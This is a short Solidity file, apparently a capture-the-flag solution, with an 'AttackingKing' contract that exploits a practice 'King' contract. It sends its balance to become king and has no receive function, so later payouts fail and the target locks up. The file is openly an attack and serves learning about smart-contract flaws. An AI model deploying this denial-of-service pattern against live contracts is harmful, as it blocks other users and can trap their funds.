// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        console.log("---> attackers contract balance:", address(this).balance);
        // need to use call() instead of transfer() as transfer() would ran out of gas
        payable(contractAddress).call{value: address(this).balance}("");         
    }
}
